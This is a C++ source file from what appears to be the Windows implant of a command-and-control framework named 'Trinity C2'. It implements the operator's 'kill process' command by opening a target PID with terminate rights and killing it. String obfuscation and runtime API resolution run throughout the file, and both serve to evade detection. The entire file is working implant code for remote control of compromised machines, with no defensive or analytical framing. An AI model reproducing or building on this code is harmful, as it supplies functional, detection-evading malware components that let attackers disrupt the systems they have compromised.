// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <Windows.h>

#include <string>

#include "agent/commands/exec/kill_process.h"
#include "agent/util/api_resolver.h"
#include "xorstr/xorstr.hpp"

// Reference: "Trinity C2 - Documentation.pdf" §9.5.9 Kill Process — the command carries the PID of
// the process the operator wants terminated.
//
// OpenProcess(PROCESS_TERMINATE) on the target PID, TerminateProcess with a non-zero exit code,
// CloseHandle. The success text names the PID and the exit code the target was given: the only
// thing proven here is that the kernel accepted TerminateProcess for that process — nothing about
// what the target did with it before it died. A refused handle is reported with GetLastError
// (ERROR_INVALID_PARAMETER = no such process, ERROR_ACCESS_DENIED = protected/elevated target), so
// "it did nothing" never comes back as a success.

namespace agent::commands::exec {

    namespace {
        /// Exit code recorded for the terminated process. Non-zero so a shell inspecting the dead
        /// target's code cannot read it as a clean exit.
        constexpr UINT kTerminatedExitCode = 1;
    }  // namespace

    CommandResult KillProcess(const models::CheckinResponse& task) {
        if (task.pid <= 0) {
            return CommandResult::Error(xorstr_("Kill failed: invalid target PID"));
        }

        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto open_process = agent::util::resolve_api<decltype(&OpenProcess)>(kernel32, xorstr_("OpenProcess"));
        const auto terminate_process =
            agent::util::resolve_api<decltype(&TerminateProcess)>(kernel32, xorstr_("TerminateProcess"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));

        // PROCESS_TERMINATE is the only right required to terminate; the agent never needs read
        // access to the target, so a handle refused here is a real refusal, not a thin one.
        HANDLE target = open_process(PROCESS_TERMINATE, FALSE, static_cast<DWORD>(task.pid));
        if (target == nullptr) {
            const DWORD open_error = GetLastError();
            return CommandResult::Error(xorstr_("Kill failed: could not open PID ") + std::to_string(task.pid) +
                                        xorstr_(" (GetLastError ") + std::to_string(open_error) + xorstr_(")"));
        }

        const BOOL terminated = terminate_process(target, kTerminatedExitCode);
        const DWORD terminate_error = terminated ? ERROR_SUCCESS : GetLastError();
        close_handle(target);

        if (terminated == FALSE) {
            return CommandResult::Error(xorstr_("Kill failed: TerminateProcess returned error ") +
                                        std::to_string(terminate_error) + xorstr_(" for PID ") +
                                        std::to_string(task.pid));
        }

        return CommandResult::Ok(xorstr_("Terminated PID ") + std::to_string(task.pid) + xorstr_(" with exit code ") +
                                 std::to_string(kTerminatedExitCode));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
